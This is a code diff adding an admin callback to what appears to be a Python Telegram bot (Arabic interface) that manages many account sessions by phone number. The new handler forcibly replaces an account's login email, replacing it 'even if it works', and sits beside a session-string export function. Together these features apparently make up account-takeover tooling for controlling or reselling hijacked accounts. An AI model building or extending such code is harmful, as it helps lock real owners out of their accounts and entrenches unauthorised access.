@@ -159,6 +159,56 @@ async def _render_session_detail(callback: CallbackQuery, session, page: int = 0
     )
 
 
+@dp.callback_query(F.data.regexp(r"^fm\d+$"))
+async def force_mail_process(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    session = await admin_resolve.get_session_from_callback(callback.data, "forcemail")
+    if not await _guard_session_row(callback, session):
+        return
+    phone, sid = session["phone"], session["id"]
+
+    await callback.answer("⏳ جاري التغيير الإجباري...")
+    await callback.message.edit_text(
+        "⏳ جاري تغيير بريد Login (إجباري) وانتظار الكود...\n"
+        "<i>سيتم استبدال البريد الحالي حتى لو كان يعمل.</i>"
+        + ADMIN_FOOTER,
+        parse_mode="HTML",
+    )
+    await track_admin_phone_message(
+        callback.from_user.id,
+        phone,
+        callback.message.chat.id,
+        callback.message.message_id,
+    )
+    try:
+        res = await session_manager.change_login_email(phone, force=True)
+    except Exception as e:
+        logging.exception("force_mail %s: %s", phone, e)
+        res = {"success": False, "error": str(e)}
+    
+    if res["success"]:
+        new_email = res.get("email", "")
+        await callback.message.edit_text(
+            f"✅ تم تغيير البريد إجبارياً:\n<code>{h(new_email)}</code>" + ADMIN_FOOTER,
+            parse_mode="HTML",
+            reply_markup=back_to_session_keyboard(sid),
+        )
+    else:
+        await callback.message.edit_text(
+            f"❌ فشل العملية: <code>{h(res['error'])}</code>" + ADMIN_FOOTER,
+            parse_mode="HTML",
+            reply_markup=back_to_session_keyboard(sid),
+        )
+    await track_admin_phone_message(
+        callback.from_user.id,
+        phone,
+        callback.message.chat.id,
+        callback.message.message_id,
+    )
+
+
 async def _export_session_message(callback: CallbackQuery, session):
     phone = session["phone"]
     ss = await session_manager.ensure_session_string(phone)
